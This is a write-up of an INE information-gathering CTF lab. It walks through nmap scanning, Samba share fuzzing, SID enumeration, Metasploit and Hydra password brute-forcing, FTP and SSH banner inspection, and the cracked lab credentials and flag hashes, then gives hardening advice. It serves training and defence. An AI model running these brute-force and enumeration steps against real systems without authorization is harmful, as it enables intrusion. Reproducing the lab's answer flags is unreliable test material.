<div align="center">
  <h1>🎯 Information Gathering CTF 3 Walkthrough 🎯</h1>
  <p><b>Platform:</b> INE | <b>Course:</b> Assessment Methodologies: Information Gathering | <b>Difficulty:</b> Intermediate</p>
  <p><i>Date Completed: 15 October 2026</i></p>
</div>

---

## 📋 Objective
> **Conduct comprehensive network reconnaissance and service enumeration against `target.ine.local` (`192.126.190.3`). Identify non-standard network services, enumerate Samba shares and local SIDs, perform credential brute-forcing, extract confidential files from anonymous and authenticated shares, investigate verbose FTP banners, and inspect SSH pre-login warning messages to capture all 4 MD5 flag hashes.**

<div align="center">
  <img src="./images/Screenshot%202026-10-15%20121512.png" alt="INE Lab 3 Overview" width="750px">
  <br><i>Figure 1: INE Lab Environment and Objectives for Information Gathering CTF 3.</i>
</div>

<br>

## 🛠️ Tools Used
| Tool | Purpose |
| :--- | :--- |
| **Nmap** | Full-port TCP scanning (`-p-`), service detection, and OS fingerprinting. |
| **Metasploit Framework** | Running `smb_enumshares`, `smb_lookupsid`, and `smb_login` auxiliary modules. |
| **smbclient** | Connecting to Samba network shares (both anonymous and authenticated). |
| **THC-Hydra** | High-performance multi-threaded network authentication cracking on FTP and SSH. |
| **FTP Client** | Interacting with the vsftpd service running on non-standard port 5554. |
| **OpenSSH Client** | Connecting to port 22 to inspect pre-login warning banners. |
| **Bash Scripting (`share.sh`)** | Custom share name enumeration and fuzzing automation. |

<br>

---

## 🔍 1. Reconnaissance & Service Fingerprinting

### 🌐 Full-Port Network Scanning
We begin with an aggressive full TCP port scan (`-p- -sV -sC -T4`) against `target.ine.local` (`192.126.190.3`):

```bash
nmap -sV -sC target.ine.local -p- -T4
```

<div align="center">
  <img src="./images/Screenshot%202026-10-15%20121650.png" alt="Nmap Scan Results" width="750px">
  <br><i>Figure 2: Full TCP port scan exposing SSH, Samba (NetBIOS), and an FTP service on port 5554.</i>
</div>

### 📋 Port Scan Findings:
- **Port 22/tcp (SSH):** `OpenSSH 8.2p1 Ubuntu 4ubuntu0.11` (Ubuntu Linux; protocol 2.0).
- **Port 139/tcp (NetBIOS-SSN):** `Samba smbd 4.6.2`.
- **Port 445/tcp (SMB):** `Samba smbd 4.6.2` (NetBIOS name: `TARGET`, Domain: `TARGET`). Message signing enabled but not required.
- **Port 5554/tcp (FTP):** `vsftpd 2.0.8 or later` running on an unconventional high port.

<br>

---

## ⚡ 2. Flag Acquisition & Methodology

> **Note on Submission Format:**
> Flags follow the format `FLAG<N>{<MD5_HASH>}`. The INE platform requires submitting **only the 32-character MD5 hash** string.

---

### 🚩 Flag 1: Anonymous Samba Share Enumeration (`pubfiles`)
**Prompt:** *"There is a samba share that allows anonymous access. Wonder what's in there!"*

A default share enumeration via Metasploit only revealed administrative shares (`print$`, `IPC$`). To discover custom unlisted shares allowing anonymous access, we use a custom wordlist fuzzing script (`share.sh`):

```bash
# Normalize line endings and execute share discovery script
sed -i 's/\r//' share.sh
bash share.sh
```

<div align="center">
  <img src="./images/Screenshot%202026-10-15%20133824.png" alt="Share Fuzzing Script" width="750px">
  <br><i>Figure 3: Executing the custom share wordlist fuzzing script against the target.</i>
</div>

The script tests anonymous connections across common storage names until it hits a valid share:

<div align="center">
  <img src="./images/Screenshot%202026-10-15%20133911.png" alt="Anonymous Share Discovered" width="750px">
  <br><i>Figure 4: Automated fuzzing confirms successful anonymous access to the pubfiles share.</i>
</div>

**Accessing the `pubfiles` Share:**
With the share name identified, we connect using `smbclient`:

```bash
smbclient //target.ine.local/pubfiles -N
```

Listing files reveals `flag1.txt`:

```smb
smb: \> ls
  .                                   D        0  Thu Oct 15 12:10:17 2026
  ..                                  D        0  Tue Nov 19 10:44:41 2024
  flag1.txt                           N       40  Thu Oct 15 12:10:17 2026
smb: \> more flag1.txt
```

<div align="center">
  <img src="./images/Screenshot%202026-10-15%20134129.png" alt="Retrieving Flag 1" width="750px">
  <br><i>Figure 5: Connecting to pubfiles and reading flag1.txt.</i>
</div>

<div align="center">
  <img src="./images/Screenshot%202026-10-15%20134059.png" alt="Flag 1 Content" width="750px">
  <br><i>Figure 6: Content of flag1.txt displaying Flag 1.</i>
</div>

```text
FLAG1{5f3f9f03188647229c6872e19c03dbd3}
```
- **Submitted Hash:** `5f3f9f03188647229c6872e19c03dbd3`

---

### 🚩 Flag 2: SMB User Enumeration & Password Cracking (`josh:purple`)
**Prompt:** *"One of the samba users have a bad password. Their private share with the same name as their username is at risk!"*

To target the private user share, we first enumerate valid usernames on the system by querying Security Identifiers (SIDs) through MSRPC using Metasploit's `smb_lookupsid` module:

```bash
msfconsole -q
use auxiliary/scanner/smb/smb_lookupsid
set rhosts target.ine.local
run
```

<div align="center">
  <img src="./images/Screenshot%202026-10-15%20123721.png" alt="Metasploit SID Lookup" width="750px">
  <br><i>Figure 7: Metasploit SID lookup reveals local user accounts: josh (RID 1000), bob (RID 1001), and nancy (RID 1002).</i>
</div>

**Enumerated Accounts:**
- `josh` (RID 1000)
- `bob` (RID 1001)
- `nancy` (RID 1002)

Next, we launch an SMB dictionary attack against these accounts using `auxiliary/scanner/smb/smb_login`:

```bash
use auxiliary/scanner/smb/smb_login
set rhosts target.ine.local
set smbuser josh
set pass_file /root/Desktop/wordlists/unix_passwords.txt
run
```

<div align="center">
  <img src="./images/Screenshot%202026-10-15%20123915.png" alt="SMB Login Success" width="750px">
  <br><i>Figure 8: Metasploit successfully brute-forces Josh's SMB password: purple.</i>
</div>

**Valid Credentials Harvested:** `josh` : `purple`

**Accessing Josh's Private Share:**
Samba hosts home shares matching usernames. We connect to `//target.ine.local/josh`:

```bash
smbclient //target.ine.local/josh -U josh
# Password: purple
```

```smb
smb: \> ls
  .                                   D        0  Thu Oct 15 12:10:17 2026
  ..                                  D        0  Tue Nov 19 10:44:41 2024
  flag2.txt                           N      119  Thu Oct 15 12:10:17 2026
smb: \> more flag2.txt
```

<div align="center">
  <img src="./images/Screenshot%202026-10-15%20130935.png" alt="Accessing Josh Share" width="750px">
  <br><i>Figure 9: Authenticating to Josh's private share and extracting flag2.txt.</i>
</div>

<div align="center">
  <img src="./images/Screenshot%202026-10-15%20130837.png" alt="Flag 2 and FTP Hint" width="750px">
  <br><i>Figure 10: flag2.txt reveals Flag 2 along with a critical clue pointing to the FTP service.</i>
</div>

```text
FLAG2{56ba0c65272846e6a036e91091bb2a54}

Psst! I heard there is an FTP service running. Find it and check the banner.
```
- **Submitted Hash:** `56ba0c65272846e6a036e91091bb2a54`

---

### 🚩 Flag 3: FTP Service Enumeration & Credential Cracking (`alice:pretty`)
**Prompt:** *"Follow the hint given in the previous flag to uncover this one."*

The hint from Flag 2 advises: *"Psst! I heard there is an FTP service running. Find it and check the banner."*

From our Nmap scan, vsftpd is active on port **5554**. Connecting to it directly reveals an informative banner:

```bash
ftp target.ine.local 5554
```
```text
Connected to target.ine.local.
220 Welcome to blah FTP service. Reminder to users, specifically ashley, alice and amanda to change their weak passwords.
```

The administrator left a reminder specifically naming three users with weak passwords:
- `ashley`
- `alice`
- `amanda`

We compile these into `users.txt` and launch **Hydra** against the FTP service on port 5554:

```bash
hydra -L users.txt -P /root/Desktop/wordlists/unix_passwords.txt ftp://target.ine.local:5554
```

Hydra cracks Alice's credentials:
```text
[5554][ftp] host: target.ine.local   login: alice   password: pretty
```

**Authenticating to FTP & Extracting Flag 3:**
```bash
ftp target.ine.local 5554
# Name: alice
# Password: pretty
```

```ftp
230 Login successful.
ftp> ls
-rw-rw-r--    1 0        0              40 Oct 15 06:40 flag3.txt
ftp> get flag3.txt
ftp> exit
```

```bash
cat flag3.txt
```

<div align="center">
  <img src="./images/Screenshot%202026-10-15%20140001.png" alt="FTP Authentication and Flag 3" width="750px">
  <br><i>Figure 11: FTP authentication as alice, retrieving flag3.txt, and printing Flag 3.</i>
</div>

```text
FLAG3{5734e0f93cd64196ac7aace8ad19d7c3}
```
- **Submitted Hash:** `5734e0f93cd64196ac7aace8ad19d7c3`

---

### 🚩 Flag 4: SSH Legal Warning Pre-Login Banner Disclosure
**Prompt:** *"This is a warning meant to deter unauthorized users from logging in."*

The prompt mentions a *"warning meant to deter unauthorized users from logging in"*, referring to the pre-authentication legal warning banner displayed by the SSH daemon (`/etc/issue.net` / `Banner`).

We initiate an SSH connection to `target.ine.local` as `alice`:

```bash
ssh alice@target.ine.local
```

Before the password prompt is even issued, the server displays the legal warning banner containing the flag embedded directly in the message:

```text
*****************************************************************
*                                                               *
*       WARNING: Unauthorized access to this system             *
*       is strictly prohibited and may be subject to            *
*       criminal prosecution.                                   *
*                                                               *
*       This system is for authorized users only.               *
*       All activities on this system are monitored             *
*       and recorded.                                           *
*                                                               *
*       By accessing this system, you consent to                *
*       such monitoring and recording.                          *
*                                                               *
*       If you are not an authorized user,                      *
*       disconnect immediately.                                 *
*                                                               *
*****************************************************************
*                                                               *
*   Is this what you're looking for?: FLAG4{45cdb0c2ba254471836329715727413b}   *
*                                                               *
*****************************************************************
alice@target.ine.local's password:
```

<div align="center">
  <img src="./images/Screenshot%202026-10-15%20140519.png" alt="SSH Banner Flag 4" width="750px">
  <br><i>Figure 12: SSH legal warning banner disclosing Flag 4 prior to authentication.</i>
</div>

```text
FLAG4{45cdb0c2ba254471836329715727413b}
```
- **Submitted Hash:** `45cdb0c2ba254471836329715727413b`

<br>

---

## 🏁 3. Flags Summary

| Flag # | Challenge Description | Extracted Flag | Submitted Hash | Discovery Vector |
| :---: | :--- | :--- | :--- | :--- |
| **1** | Anonymous Samba share | `FLAG1{5f3f9f03188647229c6872e19c03dbd3}` | `5f3f9f03188647229c6872e19c03dbd3` | Share fuzzing (`pubfiles`) via `share.sh` & `smbclient` |
| **2** | Samba user with weak password | `FLAG2{56ba0c65272846e6a036e91091bb2a54}` | `56ba0c65272846e6a036e91091bb2a54` | SID lookup (`smb_lookupsid`), brute-force (`josh:purple`) |
| **3** | FTP service and banner hint | `FLAG3{5734e0f93cd64196ac7aace8ad19d7c3}` | `5734e0f93cd64196ac7aace8ad19d7c3` | Port 5554 banner analysis, Hydra crack (`alice:pretty`) |
| **4** | Pre-login warning banner | `FLAG4{45cdb0c2ba254471836329715727413b}` | `45cdb0c2ba254471836329715727413b` | OpenSSH legal warning banner (`/etc/issue.net`) |

<br>

---

## 🛡️ 4. Vulnerability Analysis & Hardening Recommendations

<details>
<summary><b>Click to expand vulnerability details & remediation guide</b></summary>
<br>

### 📌 1. Anonymous Samba Share Configuration
- **Vulnerability:** Unauthenticated users can connect to the `pubfiles` share and read stored files.
- **Remediation:** Disable guest/anonymous access in `/etc/samba/smb.conf`:
  ```ini
  [pubfiles]
     guest ok = no
     public = no
     valid users = @authorized_group
  ```

### 📌 2. RPC SID User Enumeration
- **Vulnerability:** Anonymous RPC sessions allow remote attackers to translate SIDs to usernames (`smb_lookupsid`), mapping out organizational users.
- **Remediation:** Restrict anonymous LSA/SAMR queries in Samba:
  ```ini
  [global]
     restrict anonymous = 2
  ```

### 📌 3. Weak User Passwords
- **Vulnerability:** Accounts (`josh:purple`, `alice:pretty`) utilize common dictionary passwords susceptible to brute-forcing.
- **Remediation:** Implement PAM password complexity modules (`pam_pwquality`) requiring minimum length (12+ characters), mixed case, numbers, and symbols. Enforce account lockout thresholds after consecutive failed attempts (`pam_faillock`).

### 📌 4. Information Disclosure in Service Banners
- **Vulnerability:** The vsftpd banner on port 5554 leaked internal usernames (`ashley`, `alice`, `amanda`), while the SSH pre-login banner contained secret challenge data.
- **Remediation:** Configure banners to display strictly generic legal disclaimers without usernames, versions, or system internals:
  ```ini
  # vsftpd.conf
  ftpd_banner=Authorized Access Only.
  ```
  ```ini
  # sshd_config
  Banner /etc/issue.net
  # Ensure /etc/issue.net contains only generic legal warnings.
  ```

### 📌 5. Non-Standard Port Security (Security through Obscurity)
- **Vulnerability:** Moving vsftpd to port 5554 failed to prevent discovery once full-port scanning (`-p-`) was conducted.
- **Remediation:** Rely on robust authentication, firewall filtering, and intrusion detection (e.g., Fail2ban) rather than port obscurity.
</details>

<br>

---

## 💡 5. Key Learnings & Takeaways
- **Full-Port Scans Are Critical:** Standard top-1000 scans would have completely missed the FTP service running on port 5554. Always run `-p-` during thorough network assessments.
- **SID Brute-Forcing for Accurate Wordlists:** Instead of guessing usernames blindly, querying MSRPC RIDs allows extracting exact local and domain usernames directly from the SAM database.
- **Banner Information Gathering:** Pre-authentication banners in FTP and SSH often leak organizational context, operational warnings, and user identities.
- **Service Cross-Pollination:** Discoveries made in one protocol (Samba hints pointing to FTP, FTP hints providing usernames for SSH/FTP) illustrate how penetration testers chain disparate service data into a complete attack path.

---
<div align="center">
  <i>Walkthrough compiled on 15 October 2026. Documented for INE Penetration Testing certification path.</i>
</div>
